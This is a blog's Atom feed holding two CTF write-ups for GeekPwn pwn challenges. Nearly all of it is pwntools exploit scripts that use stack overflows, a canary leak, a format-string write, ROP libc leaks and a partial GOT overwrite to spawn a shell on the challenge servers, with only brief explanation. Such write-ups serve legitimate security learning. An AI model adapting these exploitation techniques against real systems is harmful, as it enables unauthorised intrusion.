<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>eternal</title>
  <icon>https://www.gravatar.com/avatar/3369fb0bbb9338741f76f98838dc8b64</icon>
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2020-11-27T05:16:59.821Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>eternal</name>
    <email>1397239425@qq.com</email>
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Geekpwn_pwn_writeup</title>
    <link href="http://example.com/2020/11/27/Geekpwn-pwn-writeup/"/>
    <id>http://example.com/2020/11/27/Geekpwn-pwn-writeup/</id>
    <published>2020-11-27T05:06:17.000Z</published>
    <updated>2020-11-27T05:16:59.821Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="jichu"><a href="#jichu" class="headerlink" title="jichu"></a>jichu</h2><p><strong>exp:</strong> </p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line"></span><br><span class="line">p&#x3D;remote(&#39;172.18.0.1&#39;,10000)</span><br><span class="line">#p&#x3D;process(&#39;.&#x2F;jichu&#39;)</span><br><span class="line">elf&#x3D;ELF(&#39;.&#x2F;jichu&#39;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh&#x3D;0x080482ea</span><br><span class="line">system&#x3D;elf.symbols[&#39;system&#39;]</span><br><span class="line"></span><br><span class="line">payload&#x3D;&#39;a&#39;*0x48+&#39;aaaa&#39;+p32(system)+p32(0xdeadbeef)+p32(sh)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(&#39;Please input admin password:&#39;,&#39;administrator&#39;)</span><br><span class="line">p.sendline(&#39;1&#39;)</span><br><span class="line">p.sendlineafter(&#39;Please input new log info:&#39;,payload)</span><br><span class="line">p.sendline(&#39;4&#39;)</span><br><span class="line">p.sendline(&#39;cat flag&#39;)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="pwn00"><a href="#pwn00" class="headerlink" title="pwn00"></a>pwn00</h2><p><strong>exp:</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> #coding&#x3D;utf-8</span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import*</span><br><span class="line">context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line"></span><br><span class="line">if args[&#39;REMOTE&#39;]:</span><br><span class="line">    p &#x3D; remote(&#39;81.69.0.47&#39;,1000)</span><br><span class="line">else:</span><br><span class="line">    p &#x3D; process(&quot;.&#x2F;pwn00&quot;)</span><br><span class="line"></span><br><span class="line">pop_ret&#x3D;0x0000000000400813</span><br><span class="line">def main():</span><br><span class="line">p.recvuntil(&quot;Do you want to play with me?\n&quot;)</span><br><span class="line">payload&#x3D;&#39;a&#39;*0x70+&#39;aaaaaaaa&#39;+p64(pop_ret)+p64(0x4008B5)+p64(0x4007A2)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">main()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="baby-canary"><a href="#baby-canary" class="headerlink" title="baby_canary"></a>baby_canary</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> #coding&#x3D;utf-8</span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import*</span><br><span class="line">context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line"></span><br><span class="line">if args[&#39;REMOTE&#39;]:</span><br><span class="line">    p &#x3D; remote(&#39;81.69.0.47&#39;,3333)</span><br><span class="line">else:</span><br><span class="line">    p &#x3D; process(&quot;.&#x2F;baby_canary&quot;)</span><br><span class="line"></span><br><span class="line">pop_rdi_ret&#x3D;0x400873</span><br><span class="line"># bin_sh&#x3D;0x00000000004008ee</span><br><span class="line">bin_sh&#x3D;0x00000000004008ED</span><br><span class="line">system&#x3D;0x4007FC</span><br><span class="line">def main():</span><br><span class="line">p.recvuntil(&#39;plz tell me.\n&#39;)</span><br><span class="line">payload&#x3D;&#39;a&#39;*0x68</span><br><span class="line"># gdb.attach(p)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(&#39;a&#39;*0x68)</span><br><span class="line">canary&#x3D;u64(p.recv(8).ljust(8,&quot;\x00&quot;))-0xa</span><br><span class="line">print hex(canary)</span><br><span class="line">payload&#x3D;&#39;a&#39;*0x68+p64(canary)+p64(0)+p64(pop_rdi_ret)+p64(bin_sh)+p64(system)</span><br><span class="line">p.send(payload)</span><br><span class="line"># p.recv()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">main()</span><br></pre></td></tr></table></figure><h2 id="fmt"><a href="#fmt" class="headerlink" title="fmt"></a>fmt</h2><p><strong>exp:</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">exp：</span><br><span class="line">#coding&#x3D;utf-8</span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import*</span><br><span class="line">context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line"></span><br><span class="line">if args[&#39;REMOTE&#39;]:</span><br><span class="line">    p &#x3D; remote(&#39;81.69.0.47&#39;, 2222)</span><br><span class="line">else:</span><br><span class="line">    p &#x3D; process(&quot;.&#x2F;fmt&quot;)</span><br><span class="line"></span><br><span class="line">elf&#x3D;ELF(&#39;.&#x2F;fmt&#39;)</span><br><span class="line">system&#x3D;0x4012DB</span><br><span class="line"></span><br><span class="line">system_plt&#x3D;elf.plt[&#39;system&#39;]</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">p.recvuntil(&#39;hello world!&#39;)</span><br><span class="line">bss&#x3D;0x40409C</span><br><span class="line">payload&#x3D;&#39;%&#39;+str(0x1000)+&#39;c%12$hn&#39;+&#39;%&#39;+str(0x1000)+&#39;c%13$hn&#39;+&#39;\x00&#39;*8+p64(bss)+p64(bss+2)  &#x2F;&#x2F;格式化字符串写入操作</span><br><span class="line">修改seed地址后两字节        修改seed地址前两字节                       两字节两字节修改的bss段安排</span><br><span class="line"># gdb.attach(p,&#39;b *0x401261\nc\n&#39;)</span><br><span class="line"></span><br><span class="line"># gdb.attach(p)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">sleep(1)</span><br><span class="line">a&#x3D;[&#39;2121385791&#39;,&#39;1417272958&#39;,&#39;1222019344&#39;,&#39;189308997&#39;,&#39;2113086160&#39;,&#39;43315344&#39;,&#39;1978613629&#39;,&#39;710758478&#39;,&#39;1825758792&#39;,&#39;118621091&#39;,&#39;1330609383&#39;,&#39;97980547&#39;,&#39;203100239&#39;,&#39;120334289&#39;,&#39;1085921916&#39;,&#39;75582125&#39;]</span><br><span class="line">print(len(a))</span><br><span class="line">for i in range(0,len(a)):</span><br><span class="line">p.sendline(a[i])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(&quot;running sh&quot;)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">main()</span><br></pre></td></tr></table></figure><h2 id="pwn111"><a href="#pwn111" class="headerlink" title="pwn111"></a>pwn111</h2><p><strong>exp:</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> #coding&#x3D;utf-8</span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import*</span><br><span class="line"># context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line"></span><br><span class="line">if args[&#39;REMOTE&#39;]:</span><br><span class="line">    p &#x3D; remote(&#39;81.69.0.47&#39;, 1122)</span><br><span class="line">else:</span><br><span class="line">    p &#x3D; process(&quot;.&#x2F;pwn111&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">libc&#x3D;ELF(&#39;.&#x2F;libc&#39;)</span><br><span class="line">elf&#x3D;ELF(&#39;.&#x2F;pwn111&#39;)</span><br><span class="line">pop_rbp_ret&#x3D;0x000000000040112d</span><br><span class="line">pop_rdi_ret&#x3D;0x0000000000401233</span><br><span class="line">write_plt&#x3D;elf.plt[&#39;write&#39;]</span><br><span class="line">libc_start_main_got&#x3D;elf.got[&#39;__libc_start_main&#39;]</span><br><span class="line"></span><br><span class="line">#libc中的基地址</span><br><span class="line">bin_sh_libc&#x3D;next(libc.search(&quot;&#x2F;bin&#x2F;sh&quot;))                     #0x0000000000180544</span><br><span class="line">system_libc&#x3D;libc.symbols[&#39;system&#39;]</span><br><span class="line">print hex(bin_sh_libc)</span><br><span class="line">print hex(system_libc)</span><br><span class="line"></span><br><span class="line">#函数的偏移offset</span><br><span class="line">libc_start_main_offset&#x3D;libc.symbols[&#39;__libc_start_main&#39;]</span><br><span class="line"></span><br><span class="line">p.recvuntil(&quot;please input: &quot;)</span><br><span class="line"></span><br><span class="line"># gdb.attach(p)</span><br><span class="line">main&#x3D;0x0000000000401146</span><br><span class="line">rsi_r15_ret&#x3D;0x0000000000401231</span><br><span class="line">r14_r15_ret&#x3D;0x0000000000401230</span><br><span class="line">payload1&#x3D;&#39;a&#39;*0x88+p64(pop_rdi_ret)+p64(1)+p64(rsi_r15_ret)+p64(libc_start_main_got)+p64(0)+p64(write_plt)+p64(main)</span><br><span class="line"></span><br><span class="line">p.sendline(payload1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#打印出write()函数在got表中的地址</span><br><span class="line">libc_start_main_add&#x3D;u64(p.recv(6).ljust(8,&quot;\x00&quot;))</span><br><span class="line"></span><br><span class="line">print &quot;libc_start_main_add&#x3D;&quot;+hex(libc_start_main_add)</span><br><span class="line">offset&#x3D;libc_start_main_add-libc_start_main_offset</span><br><span class="line">system_add&#x3D;offset+system_libc</span><br><span class="line">bin_sh_add&#x3D;offset+bin_sh_libc</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">payload2&#x3D;&#39;a&#39;*0x80+&#39;a&#39;*8+p64(pop_rdi_ret)+p64(bin_sh_add)+p64(system_add)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">main()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="GeekPwn" scheme="http://example.com/categories/GeekPwn/"/>
    
    
    <category term="pwn" scheme="http://example.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>Geekpwn Pwn222</title>
    <link href="http://example.com/2020/11/26/GeekPwn-pwn222/"/>
    <id>http://example.com/2020/11/26/GeekPwn-pwn222/</id>
    <published>2020-11-26T10:17:48.000Z</published>
    <updated>2020-11-26T10:17:48.891Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>无输出函数，尝试使用__do_global_dtors_aux时发现在栈上并没有残留的地址。</p><p>由于read()函数为该程序唯一输入程序，不考虑对其下手。剩下有realpath()函数和setvbuf()函数，realpath()函数为比较高级的函数，其附近的函数不好利用，而根据提供的libc库文件发现setvbuf()函数距离puts()函数非常的近，考虑用read()函数构造ROP修改setvbuf()got表的后两位，将其修改为puts()函数，由于修改了倒数第二位，所以每次只有1/16的几率修改成功。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># r=remote(&#x27;81.69.0.47&#x27;,2212)</span></span><br><span class="line">        r=process(<span class="string">&#x27;./pwn222&#x27;</span>)</span><br><span class="line">        elf = ELF(<span class="string">&#x27;./pwn222&#x27;</span>)</span><br><span class="line">        libc = ELF(<span class="string">&#x27;./libc&#x27;</span>)</span><br><span class="line">        rdi = <span class="number">0x401233</span></span><br><span class="line">        rsir15 = <span class="number">0x401231</span></span><br><span class="line">        leave = <span class="number">0x4011aa</span></span><br><span class="line">        bss = <span class="number">0x404500</span></span><br><span class="line">        setvbuf_got = elf.got[<span class="string">&#x27;setvbuf&#x27;</span>]</span><br><span class="line">        read = elf.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">        fake_puts = elf.symbols[<span class="string">&#x27;setvbuf&#x27;</span>]</span><br><span class="line">        read_got = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">        <span class="built_in">print</span> <span class="built_in">hex</span>(setvbuf_got)</span><br><span class="line"></span><br><span class="line">            <span class="comment">#r.sendline(cyclic(32)+p64(bss-8)+p64(rdi)+p64(0)+p64(rsir15)+p64(setvbuf_got)+p64(0))</span></span><br><span class="line">        make_puts = p64(rdi)+p64(<span class="number">0</span>)+p64(rsir15)+p64(setvbuf_got)+p64(<span class="number">0</span>)+p64(read)</span><br><span class="line">        leak_read = p64(rdi)+p64(read_got)+p64(fake_puts)</span><br><span class="line">        move_stack = p64(rdi)+p64(<span class="number">0</span>)+p64(rsir15)+p64(bss)+p64(<span class="number">0</span>)+p64(read)+p64(leave)</span><br><span class="line">        exp = make_puts + leak_read + move_stack</span><br><span class="line"></span><br><span class="line">        r.sendline(cyclic(<span class="number">32</span>)+p64(bss-<span class="number">8</span>)+exp)</span><br><span class="line">        sleep(<span class="number">1</span>)</span><br><span class="line">        r.send(p16(<span class="number">0xf6a0</span>))</span><br><span class="line">        libc_addr = u64(r.recv(<span class="number">6</span>)+<span class="string">&#x27;\x00\x00&#x27;</span>) - libc.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">        system = libc_addr + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">        binsh = libc_addr + libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()</span><br><span class="line">        r.sendline(p64(rdi)+p64(binsh)+p64(system))</span><br><span class="line">        sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        r.interactive()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
  </entry>
  
</feed>
